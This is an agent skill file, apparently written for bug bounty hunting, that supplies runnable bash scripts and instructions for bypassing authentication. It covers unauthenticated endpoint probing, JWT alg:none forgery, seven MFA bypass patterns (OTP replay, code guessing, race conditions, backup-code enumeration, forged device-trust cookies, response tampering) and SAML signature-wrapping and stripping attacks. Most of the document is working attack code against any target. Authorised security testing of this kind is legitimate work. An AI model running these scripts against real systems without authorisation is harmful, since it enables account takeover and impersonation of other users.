---
name: k1nzr3c0n-hunt-auth-bypass
description: "Authentication Bypass hunting skill. Covers SSO/SAML bypass, JWT manipulation, legacy protocol attacks (XMLRPC, SOAP), MFA bypass (7 patterns: direct access skip, OTP replay, invalid acceptance, prefix oracle, race condition, backup code enum, device trust bypass), SAML XSW."
tags: [auth-bypass, mfa, saml, jwt, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Authentication Bypass + MFA Bypass

> **Body-Diff Rule**: "auth bypassed" requires access to protected resource body, not just 200 status.
> **Two-account rule**: prove you accessed a DIFFERENT account's protected area.

---

## Crown Jewels

```
Priority 1 — Direct access skip: protected endpoint accessible without any auth
Priority 2 — SAML signature strip / XSW → impersonate any user
Priority 3 — JWT alg:none or RS256→HS256 confusion → forge token
Priority 4 — MFA OTP replay / race condition bypass
Priority 5 — Device trust bypass: skip MFA via device cookie manipulation
```

---

## Phase 0 — Direct Access Without Auth

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_authbypass_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== Direct Access: Protected Endpoints Without Auth ==="
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+(?:admin|dashboard|internal|account|profile|settings|console|api/user|api/admin)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/protected_endpoints.txt" | head -20

for EP in $(head -30 "$HUNT/protected_endpoints.txt"); do
  # Test without any auth header
  STATUS_NOAUTH=$(curl -sk -o /dev/null -w '%{http_code}' "$EP" 2>/dev/null)
  # Test with auth
  STATUS_AUTH=$(curl -sk -o /dev/null -w '%{http_code}' "$EP" \
    -H "Authorization: Bearer ${SESSION_TOKEN:-}" 2>/dev/null)
  
  [ "$STATUS_NOAUTH" -lt 400 ] && \
    echo "  [NO-AUTH $STATUS_NOAUTH vs AUTH $STATUS_AUTH] $EP"
done
```

## Phase 1 — JWT Bypass (see hunt-jwt for full)

```bash
echo "=== JWT Authentication Bypass ==="
JWT_TOKEN="${JWT_TOKEN:-}"
if [ -n "$JWT_TOKEN" ]; then
  # Decode header
  HEADER=$(echo "$JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool)
  echo "Header: $HEADER"
  
  # Test alg:none
  HEADER_B64=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
  PAYLOAD_B64=$(echo "$JWT_TOKEN" | cut -d. -f2)
  ALG_NONE_TOKEN="${HEADER_B64}.${PAYLOAD_B64}."
  
  RESP=$(curl -sk "https://${TARGET}/api/user/me" \
    -H "Authorization: Bearer ${ALG_NONE_TOKEN}")
  echo "$RESP" | grep -qiE '"email"|"id"|"username"' && echo "  [JWT alg:none BYPASS]"
fi
echo "  → /skill k1nzr3c0n-hunt-jwt for full JWT attack methodology"
```

## Phase 2 — 7-Pattern MFA Bypass

```bash
echo "=== MFA Bypass — 7 Patterns ==="
MFA_EP="${MFA_ENDPOINT:-https://${TARGET}/api/auth/mfa/verify}"
SESSION_COOKIE="${SESSION_COOKIE:-}"

# Pattern 1: Direct access skip (skip MFA step entirely)
echo "--- Pattern 1: Skip MFA step ---"
curl -sk "https://${TARGET}/api/user/me" \
  -H "Cookie: ${SESSION_COOKIE}" | python3 -m json.tool 2>/dev/null | head -5
echo "  If profile accessible without completing MFA → skip confirmed"

# Pattern 2: OTP code replay (use same code twice)
echo ""
echo "--- Pattern 2: OTP Replay ---"
USED_OTP="${USED_OTP:-123456}"
RESP1=$(curl -sk -X POST "$MFA_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -d "code=${USED_OTP}")
echo "  First: ${RESP1:0:50}"
RESP2=$(curl -sk -X POST "$MFA_EP" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -d "code=${USED_OTP}")
echo "  Replay: ${RESP2:0:50}"
[ "$RESP1" = "$RESP2" ] && echo "  [REPLAY] Same response — OTP reused"

# Pattern 3: Invalid OTP acceptance (try 000000, 111111)
echo ""
echo "--- Pattern 3: Invalid OTP Acceptance ---"
for CODE in 000000 111111 999999 123456 654321; do
  RESP=$(curl -sk -X POST "$MFA_EP" \
    -H "Cookie: ${SESSION_COOKIE}" \
    -d "code=${CODE}")
  echo "$RESP" | grep -qiE '"success":true|"token":|"session"' && \
    echo "  [INVALID ACCEPTED] Code: $CODE"
done

# Pattern 4: Race condition (two simultaneous valid OTPs)
echo ""
echo "--- Pattern 4: MFA Race Condition ---"
VALID_OTP="${VALID_OTP:-}"
[ -n "$VALID_OTP" ] && for I in $(seq 1 5); do
  curl -sk -X POST "$MFA_EP" \
    -H "Cookie: ${SESSION_COOKIE}" \
    -d "code=${VALID_OTP}" &
done && wait

# Pattern 5: Backup code enumeration
echo ""
echo "--- Pattern 5: Backup Code Enumeration ---"
BACKUP_EP="${BACKUP_EP:-https://${TARGET}/api/auth/backup/verify}"
for CODE in $(seq -w 0 100); do
  RESP=$(curl -sk -X POST "$BACKUP_EP" \
    -H "Cookie: ${SESSION_COOKIE}" \
    -d "code=${CODE}")
  echo "$RESP" | grep -qiE '"success":true|"token"' && \
    { echo "  [BACKUP] Code ${CODE} works"; break; }
done

# Pattern 6: Device trust bypass
echo ""
echo "--- Pattern 6: Device Trust Cookie ---"
curl -sk "https://${TARGET}/api/auth/login" \
  -H "Content-Type: application/json" \
  -H "Cookie: ${SESSION_COOKIE}; device_trusted=true; skip_mfa=1" \
  -d '{"email": "victim@example.com"}' | head -5

# Pattern 7: Response manipulation
echo ""
echo "--- Pattern 7: Response Manipulation ---"
echo "  Intercept MFA verification response and change:"
echo "  {'mfa_required': true} → {'mfa_required': false}"
echo "  {'verified': false} → {'verified': true}"
echo "  HTTP 401 → HTTP 200 with valid session"
```

## Phase 3 — SAML Attacks

```bash
echo "=== SAML Authentication Bypass ==="
echo "Prerequisites: Intercept SAMLResponse from SSO login flow"
echo ""
echo "Attack 1: SAML XSW (XML Signature Wrapping)"
echo "  Use SAMLRaider (Burp Extension) → right-click SAMLResponse → Attack"
echo "  Tries 8 XSW variants automatically"
echo ""
echo "Attack 2: Comment injection"
echo "  username: admin<!--\n-->@target.com"
echo "  (comment stripped, IDP sees admin@target.com, SP sees admin)"
echo ""
echo "Attack 3: Signature stripping"
echo "  Remove <Signature> block from SAMLResponse"
echo "  If SP doesn't validate → any username accepted"
echo ""
echo "Attack 4: NameID manipulation"
echo "  Change NameID to admin@target.com in SAMLResponse"
echo "  Only works if SP doesn't verify signature"
```

## Gate 0

```bash
echo "=== Auth Bypass Gate 0 ==="
echo "  □ Protected resource body returned (not just 200 status)"
echo "  □ Body contains data belonging to a different user"
echo "  □ JWT: forged token accepted on protected endpoint"
echo "  □ MFA: access to 2FA-protected account confirmed"
echo "  □ SAML: logged in as different user (email/name in response)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Authentication bypass on [/api/admin/users]: endpoint accessible without authentication returning full user database
MFA bypass via OTP replay on [/api/auth/mfa]: same OTP accepted twice allowing second factor skip
SAML XSW attack on [SSO endpoint] allows impersonating any user including admin@target.com
```
